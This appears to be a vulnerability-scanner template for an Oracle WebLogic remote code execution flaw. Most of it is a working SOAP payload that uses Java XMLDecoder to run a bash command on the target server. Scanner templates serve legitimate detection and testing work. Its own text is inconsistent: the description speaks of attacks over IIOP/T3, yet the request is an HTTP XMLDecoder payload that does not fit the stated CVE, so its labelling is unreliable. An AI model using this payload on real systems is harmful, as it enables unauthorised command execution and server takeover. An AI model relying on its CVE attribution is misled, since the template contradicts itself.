id: CVE-2020-14645

info:
  name: Oracle WebLogic Server Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component Core). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via IIOP, T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.

http:
  - method: POST
    path:
      - "/wls-wsat/CoordinatorPortType"
    headers:
      Content-Type: "text/xml"
    body: |
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
              <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                  <void index="0">
                    <string>/bin/bash</string>
                  </void>
                  <void index="1">
                    <string>-c</string>
                  </void>
                  <void index="2">
                    <string>touch /tmp/pwned</string>
                  </void>
                </array>
                <void method="start"/>
              </void>
            </java>
          </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
      </soapenv:Envelope>
    matchers:
      - type: word
        words:
          - "<faultstring>java.lang.ProcessBuilder"
        part: body